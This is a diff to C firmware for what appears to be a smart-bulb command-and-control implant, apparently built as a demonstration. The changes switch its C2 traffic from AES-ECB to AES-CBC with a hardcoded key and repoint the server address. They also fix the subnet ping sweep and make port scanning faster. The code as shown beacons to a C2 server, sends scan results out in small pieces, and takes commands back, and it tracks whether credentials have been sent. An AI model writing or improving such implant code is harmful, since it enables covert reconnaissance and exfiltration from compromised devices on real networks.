@@ -19,10 +19,13 @@
 // --- CONFIGURATION ---
 #define C2_HEARTBEAT_DELAY 5000
 #define BULB_ID "002"
-#define C2_SERVER_IP "172.222.1.2"//"172.222.1.2" 
+#define C2_SERVER_IP "10.2.1.10"//"10.2.1.10"//"172.222.1.2" 
 #define C2_SERVER_PORT 8080
 #define C2_PACKET_SIZE 256
-const unsigned char AES_KEY[] = "1234567890123456"; 
+#define FULL_PACKET_SIZE (C2_PACKET_SIZE + 16) // 16 bytes for IV
+#define C2_AES_BITS 256
+//Would be an env variable in a real implant, hardcoded here for demo purposes
+const unsigned char C2_AES_KEY[] = "lLwpwJEc6AZkmnm/fhrfHWhm7F7CZCOW"; 
 
 // --- PROTOCOL ---
 #define C2_TYPE_HEARTBEAT "hb"
@@ -45,35 +48,54 @@ int g_creds_sent = 0;
 
 // Ports relevant to IoT and Servers
 const uint16_t target_ports[] = {20, 21, 22, 23, 53, 80, 115, 443};
-#define PORT_COUNT (sizeof(target_ports) / sizeof(target_ports[0]))
+#define C2_PORT_COUNT (sizeof(target_ports) / sizeof(target_ports[0]))
 
-/**
- * AES-128-ECB Encryption
- * Server uses ECB, so we encrypt block-by-block.
- */
-void encrypt_packet(unsigned char *data) {
+void encrypt_packet(unsigned char *buffer) {
     mbedtls_aes_context aes;
-    mbedtls_aes_init(&aes);
-    mbedtls_aes_setkey_enc(&aes, AES_KEY, 128);
+    unsigned char iv[16];
+    unsigned char temp_plaintext[C2_PACKET_SIZE];
 
-    for (int i = 0; i < C2_PACKET_SIZE; i += 16) {
-        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_ENCRYPT, data + i, data + i);
+    // 1. Generate the IV
+    for(int i = 0; i < 16; i++) {
+        iv[i] = (unsigned char)(rand() % 256);
     }
+
+    // 2. BACKUP the data that is currently at the start of the buffer
+    memcpy(temp_plaintext, buffer, C2_PACKET_SIZE);
+
+    mbedtls_aes_init(&aes);
+    mbedtls_aes_setkey_enc(&aes, C2_AES_KEY, C2_AES_BITS);
+
+    // 3. Encrypt from the TEMP buffer into the OFFSET position (+16)
+    unsigned char iv_copy[16];
+    memcpy(iv_copy, iv, 16);
+    mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_ENCRYPT, C2_PACKET_SIZE, iv_copy, temp_plaintext, buffer + 16);
+
     mbedtls_aes_free(&aes);
+
+    // 4. Place the IV at the very beginning
+    memcpy(buffer, iv, 16);
 }
 
-/**
- * AES-128-ECB Decryption
- */
-void decrypt_packet(unsigned char *data) {
+void decrypt_packet(unsigned char *buffer) {
     mbedtls_aes_context aes;
+    unsigned char iv[16];
+    
+    // 1. Extract the IV from the first 16 bytes
+    memcpy(iv, buffer, 16);
+    
+    // 2. Decrypt the 256-byte ciphertext at the offset
     mbedtls_aes_init(&aes);
-    mbedtls_aes_setkey_dec(&aes, AES_KEY, 128);
-
-    for (int i = 0; i < C2_PACKET_SIZE; i += 16) {
-        mbedtls_aes_crypt_ecb(&aes, MBEDTLS_AES_DECRYPT, data + i, data + i);
-    }
+    mbedtls_aes_setkey_dec(&aes, C2_AES_KEY, C2_AES_BITS);
+    
+    mbedtls_aes_crypt_cbc(&aes, MBEDTLS_AES_DECRYPT, C2_PACKET_SIZE, iv, buffer + 16, buffer + 16);
     mbedtls_aes_free(&aes);
+
+    // 3. Shift plaintext to the front so command parsing (strstr) works
+    memmove(buffer, buffer + 16, C2_PACKET_SIZE);
+    
+    // 4. Null-terminate the end of the data portion for string safety
+    buffer[C2_PACKET_SIZE] = '\0';
 }
 
 void run_port_scan(void *arg) {
@@ -89,7 +111,7 @@ void run_port_scan(void *arg) {
     snprintf(g_scan_buffer, 64, "TARGET:%s|", target_ip);
 
     // 2. Scan the defined port list
-    for (int i = 0; i < PORT_COUNT; i++) {
+    for (int i = 0; i < C2_PORT_COUNT; i++) {
         if (g_stop_scan) break;
 
         int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -197,7 +219,7 @@ bool ping_target(uint32_t target_ip) {
     if (sock < 0) return false;
 
     // Set a very short timeout for the demo
-    struct timeval tv = {0, 200000}; // 200ms
+    struct timeval tv = {0, 100000}; // 100ms
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
     ADDLOGF_WARN("Scanning IP: %s", inet_ntoa(*(struct in_addr *)&target_ip));
     struct icmp_echo_hdr echo_req;
@@ -227,7 +249,7 @@ bool ping_target(uint32_t target_ip) {
 }
 
 uint32_t getIPAddr(){
-    return 0xC0A80100;
+    //return 0xC0A80100;
     IPStatusTypedef ipStatus;
     bk_wlan_get_ip_status(&ipStatus, BK_STATION);
     ip4_addr_t ip;
@@ -236,7 +258,7 @@ uint32_t getIPAddr(){
 }
 
 uint32_t getIPMask(){
-    return 0xFFFFFF00;
+    //return 0xFFFFFF00;
     IPStatusTypedef ipStatus;
     bk_wlan_get_ip_status(&ipStatus, BK_STATION);
     ip4_addr_t mask;
@@ -252,8 +274,9 @@ void run_ip_ping_sweep() {
     if (!net) return;
     uint32_t b_ip = getIPAddr();
     uint32_t b_mask = getIPMask();
-    uint32_t base = b_ip & b_mask;
-    uint32_t brdcst = base | (~b_mask);
+	//Need to convert so +1 starts at the first host, not the network address
+    uint32_t base = htonl(b_ip & b_mask);
+    uint32_t brdcst = base | htonl(~b_mask);
 
     g_active_type = 1; // IP
     g_scan_ready = 1;
@@ -266,7 +289,7 @@ void run_ip_ping_sweep() {
         // Use htonl if your loop is incrementing in host byte order
         if (ping_target(target)) {
             struct in_addr addr;
-            addr.s_addr = target;
+            addr.s_addr = htonl(target);
             strcat(g_scan_buffer, inet_ntoa(addr));
             strcat(g_scan_buffer, ";");
         }
@@ -403,7 +426,7 @@ void bulb_c2_main(void *arg) {
         srv.sin_addr.s_addr = inet_addr(C2_SERVER_IP);
 
         if (connect(sock, (struct sockaddr *)&srv, sizeof(srv)) == 0) {
-            unsigned char pkt[C2_PACKET_SIZE] = {0};
+            unsigned char pkt[FULL_PACKET_SIZE] = {0};
 
             // 1. Check if we have partial data ready to "drip"
             if (g_scan_ready == 2 || (g_scan_ready == 1 && strlen(g_scan_buffer) > g_scan_index + 40)) {
@@ -451,11 +474,11 @@ void bulb_c2_main(void *arg) {
             }
 
             encrypt_packet(pkt);
-            send(sock, pkt, C2_PACKET_SIZE, 0);
+            send(sock, pkt, FULL_PACKET_SIZE, 0);
 
             // 2. Listen for Tasking
-            unsigned char cmd_pkt[C2_PACKET_SIZE] = {0};
-            if (recv(sock, cmd_pkt, C2_PACKET_SIZE, 0) > 0) {
+            unsigned char cmd_pkt[FULL_PACKET_SIZE] = {0};
+            if (recv(sock, cmd_pkt, FULL_PACKET_SIZE, 0) > 0) {
                 decrypt_packet(cmd_pkt);
 				char *cmd = (char*)cmd_pkt;
 				
